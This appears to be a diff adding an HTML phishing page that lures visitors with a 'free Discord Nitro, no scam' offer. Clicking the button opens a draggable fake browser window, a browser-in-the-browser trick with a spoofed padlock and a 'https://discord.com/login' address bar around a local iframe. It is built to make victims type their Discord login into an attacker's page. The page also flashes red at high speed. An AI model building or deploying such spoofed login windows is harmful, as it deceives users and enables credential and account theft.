@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>FREE NITRO!!! (REAL NO SCAM)</title>
+    <style>
+        html,
+        body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        #title-bar {
+            height: 31px;
+            background-color: #d6dae0;
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            user-select: none;
+        }
+
+        #logo {
+            padding-left: 5px;
+            vertical-align: middle;
+            margin-right: 5px;
+            pointer-events: none;
+        }
+
+        #logo-description {
+            color: black;
+            font-size: 12px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+                Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji",
+                "Segoe UI Symbol";
+            vertical-align: middle;
+        }
+
+        #minimize {
+            color: black;
+            font-size: 12px;
+            padding: 9px 15px 7px 15px;
+            transition: all 0.2s;
+        }
+
+        #square {
+            color: black;
+            transition: all 0.2s;
+            font-size: 22px;
+            padding: 0px 15px 5px 15px;
+        }
+
+        #exit {
+            color: black;
+            transition: all 0.2s;
+            font-size: 15px;
+            padding: 7px 17px 7px 17px;
+        }
+
+        #url-bar {
+            height: 28px;
+            background-color: #f1f3f4;
+            user-select: all;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            white-space: nowrap;
+            overflow: scroll;
+            text-overflow: ellipsis;
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+            border-bottom: 1px solid lightgray;
+        }
+
+        #url-bar::-webkit-scrollbar {
+            display: none;
+        }
+
+        #ssl-padlock {
+            user-select: none;
+            padding-left: 8px;
+            margin-right: 8px;
+        }
+
+        #domain-name {
+            color: #000000;
+            font-size: 14px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+                Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji",
+                "Segoe UI Symbol";
+        }
+
+        #domain-path {
+            color: #7c7c7c;
+            font-size: 14px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+                Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji",
+                "Segoe UI Symbol";
+        }
+
+        #title-bar-width {
+            width: 100%;
+        }
+
+        #content {
+            width: 100%;
+            height: 700px;
+        }
+
+        #window {
+            color: transparent;
+            background-color: transparent;
+            border-color: transparent;
+            box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
+            height: 700px;
+            width: 1000px;
+            border-radius: 7px;
+            overflow: hidden;
+        }
+
+        body {
+            background-color: #23272a;
+            color: white;
+            font-family: sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+
+        #container {
+            position: relative;
+            width: 100%;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        h1 {
+            font-size: 4em;
+            margin-top: 50px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+            animation: rainbowText 5s linear infinite;
+            margin-top: 3em;
+        }
+
+        @keyframes rainbowText {
+            0% {
+                color: red;
+            }
+
+            16% {
+                color: orange;
+            }
+
+            33% {
+                color: yellow;
+            }
+
+            50% {
+                color: green;
+            }
+
+            66% {
+                color: blue;
+            }
+
+            83% {
+                color: indigo;
+            }
+
+            100% {
+                color: violet;
+            }
+        }
+
+        button {
+            background-color: #7289da;
+            color: white;
+            font-size: 1.5em;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+            transition: background-color 0.3s ease;
+            animation: pulseButton 2s infinite;
+        }
+
+        button:hover {
+            background-color: #677bc4;
+        }
+
+        @keyframes pulseButton {
+            0% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.1);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .circle {
+            position: absolute;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            animation: float 5s linear infinite, changeColor 3s linear infinite;
+            opacity: 0.7;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(0);
+            }
+
+            100% {
+                transform: translateY(-100vh);
+            }
+        }
+
+        @keyframes changeColor {
+            0% {
+                background-color: red;
+            }
+
+            33% {
+                background-color: blue;
+            }
+
+            66% {
+                background-color: yellow;
+            }
+
+            100% {
+                background-color: red;
+            }
+        }
+
+        .flash {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 0, 0, 0.5);
+            z-index: -1;
+            animation: intenseFlash 0.7s steps(2) infinite;
+            pointer-events: none;
+        }
+
+        @keyframes intenseFlash {
+            0% {
+                opacity: 0;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            100% {
+                opacity: 0;
+            }
+        }
+
+        @keyframes rotateLogo {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+</head>
+
+<body>
+
+    <div id="window" style="display: none">
+        <div id="title-bar-width">
+            <div id="title-bar">
+                <div style="margin-top: 5px">
+                    <img src="https://cdn.glitch.global/cbb58682-7814-4e21-a791-7965cc901a5b/Discord%20Favicon%20256x256.ico"
+                        width="20px" height="20px" id="logo" />
+                    <span id="logo-description">Discord</span>
+                </div>
+
+                <div>
+                    <span id="minimize">&#8212;</span>
+                    <span id="square">□</span>
+                    <span id="exit">✕</span>
+                </div>
+            </div>
+            <div id="url-bar">
+                <img src="https://raw.githubusercontent.com/mrd0x/BITB/2b77a9498b9f4ccebbc92fe7c2347ffaffb634cc/Windows-Chrome-LightMode/ssl.svg"
+                    width="20px" height="20px" id="ssl-padlock" />
+                <span id="domain-name">https://discord.com</span>
+                <span id="domain-path">/login</span>
+            </div>
+        </div>
+        <iframe id="content" src="./discord.html" frameborder="0"></iframe>
+    </div>
+    <div id="container">
+        <h1>FREE DISCORD NITRO!!!</h1>
+        <p>GET NITRO NOW! 100% REAL! NO SCAM!</p>
+        <p>LIMITED TIME OFFER!</p>
+        <button onclick="$('#window').fadeIn(10)">Get free discord nitro</button>
+
+        <div class="flash"></div>
+    </div>
+
+    <script>
+        for (let i = 0; i < 20; i++) {
+            let circle = document.createElement('div');
+            circle.classList.add('circle');
+            circle.style.left = Math.random() * 100 + 'vw';
+            circle.style.top = Math.random() * 100 + 'vh';
+            circle.style.animationDuration = Math.random() * 5 + 5 + 's';
+            circle.style.animationDelay = Math.random() * 2 + 's';
+            document.getElementById('container').appendChild(circle);
+        }
+
+
+        var minimize = document.getElementById("minimize");
+        var square = document.getElementById("square");
+        var exit = document.getElementById("exit");
+        var titleBar = document.getElementById("title-bar");
+
+        minimize.addEventListener("mouseover", function handleMouseOver() {
+            minimize.style.backgroundColor = "rgba(0, 0, 0, 0.09)";
+        });
+
+        minimize.addEventListener("mouseout", function handleMouseOut() {
+            minimize.style.backgroundColor = "#d6dae0";
+            minimize.style.cursor = "default";
+        });
+
+        square.addEventListener("mouseover", function handleMouseOver() {
+            square.style.backgroundColor = "rgba(0, 0, 0, 0.09)";
+        });
+
+        square.addEventListener("mouseout", function handleMouseOut() {
+            square.style.backgroundColor = "#d6dae0";
+            square.style.cursor = "default";
+        });
+
+        exit.addEventListener("mouseover", function handleMouseOver() {
+            exit.style.backgroundColor = "#E81123";
+            exit.style.color = "white";
+        });
+
+        exit.addEventListener("mouseout", function handleMouseOut() {
+            exit.style.backgroundColor = "#d6dae0";
+            exit.style.color = "black";
+            exit.style.cursor = "default";
+        });
+
+        titleBar.addEventListener("mouseout", function handleMouseOver() {
+            titleBar.style.cursor = "default";
+        });
+
+        var draggable = $("#window");
+        var title = $("#title-bar");
+
+        title.on("mousedown", function (e) {
+            var dr = $(draggable).addClass("drag");
+            height = dr.outerHeight();
+            width = dr.outerWidth();
+            (ypos = dr.offset().top + height - e.pageY),
+                (xpos = dr.offset().left + width - e.pageX);
+            $(document.body)
+                .on("mousemove", function (e) {
+                    var itop = e.pageY + ypos - height;
+                    var ileft = e.pageX + xpos - width;
+                    if (dr.hasClass("drag")) {
+                        dr.offset({ top: itop, left: ileft });
+                    }
+                })
+                .on("mouseup", function (e) {
+                    dr.removeClass("drag");
+                });
+        });
+
+        $("#exit").click(function () {
+            $("#window").fadeOut(10);
+        });
+
+        $("#square").click(enlarge);
+
+        function enlarge() {
+            if (square.classList.contains("enlarged")) {
+                $("#window").css("width", "100%");
+                $("#title-bar-width").css("width", "100%");
+                $("#content").css("width", "100%");
+                $("#square").removeClass("enlarged");
+            } else {
+                $("#window").css("width", "500px");
+                $("#title-bar-width").css("width", "100%");
+                $("#content").css("width", "100%");
+                $("#square").addClass("enlarged");
+                dr.offset({ top: "0px", left: "0px" });
+            }
+        }
+
+    </script>
+</body>
+
+</html>
